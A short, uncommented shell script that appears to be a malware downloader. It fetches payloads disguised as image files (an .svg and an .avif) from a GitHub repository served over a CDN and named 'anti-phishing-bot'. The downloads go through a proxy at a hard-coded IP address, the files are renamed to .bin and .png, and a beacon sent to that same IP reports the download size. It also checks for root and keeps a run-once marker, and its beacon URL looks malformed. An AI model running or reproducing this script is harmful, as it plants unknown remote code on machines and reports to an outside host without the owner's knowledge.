#!/bin/sh
A=$1; P=$2; N=$3
H=/tmp/p/f; [ -f $H ] && exit 0; mkdir -p /tmp/p/f; : > $H
if which runuser >/dev/null 2>&1; then if [ "$(id -u)" = 0 ]; then R="runuser -u node --"; else R=""; fi; else R=""; fi
X=http_proxy=http://34.60.89.105:$P; O=no_proxy=127.0.0.1,localhost
B=https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@1ab9a25
case "$A" in
IF)
 for i in 1 2 3; do env $X $O wget -q -t 2 -T 15 -O /tmp/p/gdad_proof.svg "$B/gdad_proof.svg" && break; sleep 2; done
 env $X $O wget -q -t 2 -T 15 -O /tmp/p/glyph.avif "$B/glyph.avif"
 cp /tmp/p/gdad_proof.svg /tmp/p/gdad_proof.bin; cp /tmp/p/glyph.avif /tmp/p/glyph.png
 wget -q -T 8 -O /dev/null "$X/m?IF=$A-$P-$N-dwn$(wc -c </tmp/p/gdad_proof.svg)";;
TRY)
 env $X $O curl -s -m 18 -o /tmp/p/gdad_proof.svg "$B/gdad_proof.svg"
 env $X $O curl -s -m 18 -o /tmp/p/glyph.avif "$B/glyph.avif"
 cp /tmp/p/gdad_proof.svg /tmp/p/gdad_proof.bin; cp /tmp/p/glyph.avif /tmp/p/glyph.png
 curl -s -m 8 -o /dev/null "$X/m?TRY=$A-$P-$N-dwn$(wc -c </tmp/p/gdad_proof.svg)";;
esac
